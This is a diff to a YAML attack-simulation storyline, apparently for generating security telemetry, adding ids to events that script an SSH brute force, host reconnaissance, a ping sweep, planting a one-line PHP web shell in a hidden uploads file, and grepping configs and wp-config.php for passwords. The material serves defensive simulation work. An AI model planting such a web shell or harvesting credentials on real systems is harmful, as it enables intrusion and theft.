@@ -206,7 +206,8 @@ output:
 
 storyline:
   # Phase 1: SSH Brute Force against web server (external attacker)
-  - time: "2024-03-12T14:15:00Z"
+  - id: evt-001
+    time: "2024-03-12T14:15:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "SSH brute force attack against web server from external IP"
@@ -217,7 +218,8 @@ storyline:
         source_ip: "45.33.32.156"
 
   # Phase 2: Initial access - successful SSH login
-  - time: "2024-03-12T14:22:00Z"
+  - id: evt-002
+    time: "2024-03-12T14:22:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Successful SSH login after brute force with compromised credentials"
@@ -228,7 +230,8 @@ storyline:
         source_ip: "45.33.32.156"
 
   # Phase 3: Local reconnaissance
-  - time: "2024-03-12T14:23:00Z"
+  - id: evt-003
+    time: "2024-03-12T14:23:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'whoami' to identify current user context"
@@ -238,7 +241,8 @@ storyline:
         process_name: "whoami"
         command_line: "whoami"
 
-  - time: "2024-03-12T14:23:30Z"
+  - id: evt-004
+    time: "2024-03-12T14:23:30Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'id' to enumerate groups and privileges"
@@ -248,7 +252,8 @@ storyline:
         process_name: "id"
         command_line: "id"
 
-  - time: "2024-03-12T14:24:00Z"
+  - id: evt-005
+    time: "2024-03-12T14:24:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'uname -a' to fingerprint operating system"
@@ -258,7 +263,8 @@ storyline:
         process_name: "uname"
         command_line: "uname -a"
 
-  - time: "2024-03-12T14:25:00Z"
+  - id: evt-006
+    time: "2024-03-12T14:25:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'cat /etc/passwd' to enumerate local accounts"
@@ -268,7 +274,8 @@ storyline:
         process_name: "cat"
         command_line: "cat /etc/passwd"
 
-  - time: "2024-03-12T14:26:00Z"
+  - id: evt-007
+    time: "2024-03-12T14:26:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'netstat -tulpn' to discover listening services"
@@ -278,7 +285,8 @@ storyline:
         process_name: "netstat"
         command_line: "netstat -tulpn"
 
-  - time: "2024-03-12T14:27:00Z"
+  - id: evt-008
+    time: "2024-03-12T14:27:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'ip addr' to identify network interfaces"
@@ -289,7 +297,8 @@ storyline:
         command_line: "ip addr"
 
   # Phase 4: Network discovery
-  - time: "2024-03-12T14:29:00Z"
+  - id: evt-009
+    time: "2024-03-12T14:29:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Execute 'arp -a' to view ARP cache for local network hosts"
@@ -299,7 +308,8 @@ storyline:
         process_name: "arp"
         command_line: "arp -a"
 
-  - time: "2024-03-12T14:30:00Z"
+  - id: evt-010
+    time: "2024-03-12T14:30:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Ping sweep of 192.168.20.0/24 subnet to discover active hosts"
@@ -310,7 +320,8 @@ storyline:
         command_line: "for i in $(seq 1 254); do ping -c 1 -W 1 192.168.20.$i; done"
 
   # Phase 5: Web shell deployment
-  - time: "2024-03-12T14:35:00Z"
+  - id: evt-011
+    time: "2024-03-12T14:35:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Deploy PHP web shell to Apache document root for persistent access"
@@ -321,7 +332,8 @@ storyline:
         command_line: "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/uploads/.info.php"
         description: "Simple PHP web shell hidden in uploads directory"
 
-  - time: "2024-03-12T14:36:00Z"
+  - id: evt-012
+    time: "2024-03-12T14:36:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Test web shell functionality via curl"
@@ -332,7 +344,8 @@ storyline:
         command_line: "curl http://localhost/uploads/.info.php?cmd=id"
 
   # Phase 6: Credential harvesting from web server configs
-  - time: "2024-03-12T14:38:00Z"
+  - id: evt-013
+    time: "2024-03-12T14:38:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Search Apache and PHP configuration for database credentials"
@@ -342,7 +355,8 @@ storyline:
         process_name: "grep"
         command_line: "grep -r password /var/www/html/ /etc/apache2/ 2>/dev/null"
 
-  - time: "2024-03-12T14:40:00Z"
+  - id: evt-014
+    time: "2024-03-12T14:40:00Z"
     actor: webadmin
     system: WEB-SRV-01
     activity: "Read wp-config.php to extract database credentials"
